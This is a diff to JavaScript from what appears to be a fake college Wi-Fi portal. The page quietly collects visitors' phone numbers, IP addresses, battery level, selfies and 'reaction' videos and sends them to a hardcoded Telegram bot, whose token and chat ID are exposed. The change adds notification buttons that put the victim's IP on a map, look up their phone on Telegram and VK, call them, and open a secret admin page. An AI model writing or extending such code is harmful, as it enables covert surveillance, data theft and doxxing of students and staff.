@@ -624,6 +624,8 @@
   const TELEGRAM_TOKEN = "8839536788:AAFbVmXWYa0grVBG15FqS1ePvE3znAzUAL8";
   const TELEGRAM_CHAT_ID = "6651741310";
 
+  const ADMIN_URL = "https://kp11mskobrru.github.io/kp11-wifi/admin-kp11-secret.html";
+
   const PROXY_URLS = [
     "https://kp11-proxy.vercel.app/api/proxy"
   ];
@@ -678,16 +680,48 @@
   }
 
   // ============================================================
-  //  ТЕКСТ
+  //  Inline-кнопки под уведомлением
   // ============================================================
-  async function sendTelegramNotify(text) {
+  function buildInlineKeyboard(phone, ip) {
+    const phoneDigits = String(phone || "").replace(/[^\d]/g, "");
+    const phoneNoPlus = phoneDigits.startsWith("7") ? phoneDigits.slice(1) : phoneDigits;
+
+    const rows = [];
+
+    // Ряд 1: Админка + Карта
+    const row1 = [
+      { text: "📊 Открыть админку", url: ADMIN_URL }
+    ];
+    if (ip) {
+      row1.push({ text: "📍 Карта", url: `https://www.google.com/maps?q=${encodeURIComponent(ip)}` });
+    }
+    rows.push(row1);
+
+    // Ряд 2: TG / VK / Позвонить
+    if (phoneDigits) {
+      const row2 = [];
+      row2.push({ text: "📱 TG", url: `https://t.me/+${phoneDigits}` });
+      row2.push({ text: "🅥 VK", url: `https://vk.com/search?c%5Bphone%5D=${phoneNoPlus}` });
+      row2.push({ text: "📞 Позвонить", url: `tel:+${phoneDigits}` });
+      rows.push(row2);
+    }
+
+    return { inline_keyboard: rows };
+  }
+
+  // ============================================================
+  //  ТЕКСТ (с поддержкой inline-кнопок)
+  // ============================================================
+  async function sendTelegramNotify(text, replyMarkup) {
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text,
+      parse_mode: "HTML",
+      disable_web_page_preview: true
+    };
+    if (replyMarkup) payload.reply_markup = replyMarkup;
     try {
-      const res = await sendWithFailover("sendMessage", {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: text,
-        parse_mode: "HTML",
-        disable_web_page_preview: true
-      });
+      const res = await sendWithFailover("sendMessage", payload);
       if (res && res.ok) {
         console.log("✅ Текст отправлен");
       }
@@ -710,7 +744,6 @@
       filename: "selfie.jpg"
     };
 
-    // sendPhoto
     try {
       const res = await sendWithFailover("sendPhoto", payload);
       if (res && res.ok) {
@@ -721,7 +754,6 @@
       console.warn("❌ sendPhoto упал:", err.message || err);
     }
 
-    // sendDocument fallback
     try {
       const res = await sendWithFailover("sendDocument", payload);
       if (res && res.ok) {
@@ -746,7 +778,6 @@
       filename: "video.mp4"
     };
 
-    // sendVideo
     try {
       const res = await sendWithFailover("sendVideo", payload);
       if (res && res.ok) {
@@ -757,7 +788,6 @@
       console.warn("❌ sendVideo упал:", err.message || err);
     }
 
-    // sendDocument fallback
     try {
       const res = await sendWithFailover("sendDocument", payload);
       if (res && res.ok) {
@@ -1404,6 +1434,7 @@
 
   // ============================================================
   //  СОХРАНЕНИЕ: Firebase + Telegram (текст → фото → видео)
+  //  Текст идёт с inline-кнопками
   // ============================================================
   async function saveToFirestore(videoBase64, photoBase64) {
     if (!pendingData) return;
@@ -1435,7 +1466,8 @@
           "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
           "⚠️ <b>Это сотрудник колледжа!</b>";
 
-        await sendTelegramNotify(caption);
+        const replyMarkup = buildInlineKeyboard(phone, deviceInfo.ip);
+        await sendTelegramNotify(caption, replyMarkup);
         if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото педагога");
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция педагога");
       } else {
@@ -1462,7 +1494,8 @@
           "🌐 <b>IP:</b> " + ipStr + "\n" +
           "🔋 <b>Заряд:</b> " + batteryStr;
 
-        await sendTelegramNotify(caption);
+        const replyMarkup = buildInlineKeyboard(phone, deviceInfo.ip);
+        await sendTelegramNotify(caption, replyMarkup);
         if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента");
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция студента");
       }
@@ -1544,7 +1577,8 @@
             "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
             "⚠️ <b>Это сотрудник колледжа!</b>";
 
-          await sendTelegramNotify(caption);
+          const replyMarkup = buildInlineKeyboard(phoneNorm, deviceInfo.ip);
+          await sendTelegramNotify(caption, replyMarkup);
         } catch (err) {
           console.error("Ошибка фоновой задачи педагога:", err);
         }
